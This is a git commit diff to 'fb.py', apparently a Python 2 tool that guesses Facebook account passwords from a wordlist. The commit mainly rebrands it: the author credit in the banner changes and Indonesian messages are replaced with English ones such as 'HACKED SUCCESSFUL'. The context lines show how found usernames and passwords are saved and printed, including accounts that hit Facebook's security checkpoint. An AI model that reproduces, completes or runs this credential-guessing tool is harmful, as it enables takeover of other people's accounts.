8261bd99066d686dc3ca8ec257d001c2af52c6f1
Shariar Sakib <glitchprovider@gmail.com>
2024-10-30 10:27:22 +0600

    Update fb.py

--- fb.py
+++ fb.py
@@ -19,15 +19,15 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
-internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Cheking Acces\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
-banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |___ |__] |  | |  | |_/\n\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_\n\033[31;1m          _  _ ____ ____ _  _ ____ ____\n          |__| |__| |    |_/  |___ |__/\n\033[37;1m          |  | |  | |___ | \_ |___ |  \\\n\033[36;1mCreated By\033[31;1m :\033[32;1m Seluruh grup \033[32;1m[\033[37;1mD4RKN355 T34M\033[32;1m]\n\033[35;1m------------------------------------------'
+internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Loading Tools\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
+banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |___ |__] |  | |  | |_/\n\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_\n\033[31;1m          _  _ ____ ____ _  _ ____ ____\n          |__| |__| |    |_/  |___ |__/\n\033[37;1m          |  | |  | |___ | \_ |___ |  \\\n\033[36;1mCreated By\033[31;1m :\033[32;1m SH4RI4R S4KIB \033[32;1m[\033[37;1mCYB3R T34M\033[32;1m]\n\033[35;1m----------------------------------'
 
 
 def ceknet():
     try:
     	os.system('reset')
         print internet
-        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
+        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mCONNECTING SERVER..'
         time.sleep(2)
         toolbar_width = 25
         sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
@@ -81,11 +81,11 @@ def start():
                         dapat.write('[ID]=> ' + email + '\n')
                         dapat.write('[PW]=> ' + pw)
                         dapat.close()
-                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
+                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD GANRATED'
                         print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                         print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
-                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
-                        print '\033[32;1m[=] \033[37;1mProgram Finish'
+                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1mHACKED SUCCESSFUL'
+                        print '\033[32;1m[=] \033[37;1mDONE'
                         sys.exit()
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
@@ -96,16 +96,16 @@ def start():
                             print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
                             print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                             print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
-                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
-                            print '\033[33;1m[=] \033[37;1mProgram Finish'
+                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHECKPOINT'
+                            print '\033[33;1m[=] \033[37;1mHACKED SUCCESSFUL'
                             sys.exit()
                 except requests.exceptions.ConnectionError:
-                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
+                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mTools error'
                     sys.exit()
 
         except IOError:
-            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
-            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
+            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mNot Found wordlist No File'
+            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mPlease Try Again Later'
             sys.exit()
 
 ceknet()
